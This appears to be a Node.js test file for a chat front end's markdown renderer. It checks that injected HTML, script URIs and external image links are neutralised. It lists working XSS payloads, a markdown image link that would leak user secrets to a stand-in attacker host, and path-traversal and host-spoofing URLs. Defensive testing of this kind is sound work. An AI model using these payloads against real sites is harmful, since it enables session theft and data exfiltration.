// node --test "tests/front/*.test.js"   (sem dependências)
const test = require('node:test');
const assert = require('node:assert/strict');
const { markdown, escapar } = require('../../Orion_Core/Front_end_Orion/md.js');

const TAGS_OK = new Set(['p', 'br', 'strong', 'em', 'code', 'pre', 'ul', 'ol', 'li', 'img', 'span']);

/** Toda `<` da saída tem de abrir/fechar uma tag da lista; `<img>` só com atributos conhecidos. */
function assertSoTagsPermitidas(html) {
    for (const m of html.matchAll(/<(\/?)([a-zA-Z0-9]*)([^>]*)>/g)) {
        assert.ok(TAGS_OK.has(m[2].toLowerCase()), `tag inesperada: ${m[0]}`);
        if (m[2].toLowerCase() === 'img') {
            assert.match(m[3], /^ src="[^"<>]*" alt="[^"<>]*" class="msg-img" loading="lazy"$/, m[0]);
        }
    }
    assert.equal((html.match(/</g) || []).length, (html.match(/<\/?[a-z0-9]+[^<>]*>/gi) || []).length,
        `'<' solto em: ${html}`);
}

test('escapa & < > " \' antes de formatar', () => {
    assert.equal(escapar(`<a href="x" onclick='y'>&`), '&lt;a href=&quot;x&quot; onclick=&#39;y&#39;&gt;&amp;');
});

const ATAQUES = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "'><svg onload=alert(1)>",
    '![x" onerror="alert(1)](https://evil.example/a.png)',
    '![x](https://evil.example/a.png" onerror="alert(1))',
    '![x](javascript:alert(1))',
    '![x](data:text/html,<script>alert(1)</script>)',
    '**<b onmouseover=alert(1)>x</b>**',
    '`<img src=x onerror=alert(1)>`',
    '```html\n<script>alert(1)</script>\n```',
    '- <iframe src=javascript:alert(1)>',
    '# <img src=x onerror=alert(1)>',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
];

for (const ataque of ATAQUES) {
    test(`HTML injetado não sobrevive: ${ataque.slice(0, 40).replace(/\n/g, '\\n')}`, () => {
        const html = markdown(ataque);
        assertSoTagsPermitidas(html);
        assert.doesNotMatch(html, /<(script|iframe|svg|b)\b/i);
    });
}

test('exfiltração por imagem: URL de outro host vira texto, nunca <img>', () => {
    const html = markdown('![resumo](https://atacante.example/c.png?d=SEGREDO-DO-USUARIO)');
    assert.doesNotMatch(html, /<img/);
    assert.match(html, /imagem externa bloqueada: resumo/);
    assert.doesNotMatch(html, /atacante|SEGREDO/);
});

test('imagem gerada pelo próprio Orion continua aparecendo', () => {
    for (const host of ['127.0.0.1', 'localhost']) {
        const html = markdown(`veja ![gato](http://${host}:8000/imagens/img_170.jpg)`);
        assert.match(html, /<img src="http:\/\/[^"]+:8000\/imagens\/img_170\.jpg" alt="gato" class="msg-img" loading="lazy">/);
    }
});

test('imagem local só vale se for um nome de arquivo em /imagens/', () => {
    const ruins = [
        'http://127.0.0.1:8000/imagens/../historico',
        'http://127.0.0.1:8000/imagens/a/b.png',
        'http://127.0.0.1:8000/imagens/%2e%2e/historico',
        'http://127.0.0.1:8000/imagens/a.png?x=1',
        'http://127.0.0.1:8000/exportar',
        'http://127.0.0.1:8001/imagens/a.png',
        'http://127.0.0.1:8000.evil.example/imagens/a.png',
        'http://127.0.0.1@evil.example:8000/imagens/a.png',
        'https://127.0.0.1:8000/imagens/a.png',
    ];
    for (const url of ruins) {
        assert.doesNotMatch(markdown(`![x](${url})`), /<img/, url);
    }
});

test('formatação básica continua funcionando', () => {
    const html = markdown('# Título\n\n**forte** e *ênfase* e `código`\n\n- a\n- b\n\n1. um\n2. dois\n\n```py\nprint("<x>")\n```');
    assert.match(html, /<p class="md-h">Título<\/p>/);
    assert.match(html, /<strong>forte<\/strong>/);
    assert.match(html, /<em>ênfase<\/em>/);
    assert.match(html, /<code>código<\/code>/);
    assert.match(html, /<ul><li>a<\/li><li>b<\/li><\/ul>/);
    assert.match(html, /<ol><li>um<\/li><li>dois<\/li><\/ol>/);
    assert.match(html, /<pre><code>print\(&quot;&lt;x&gt;&quot;\)<\/code><\/pre>/);
});
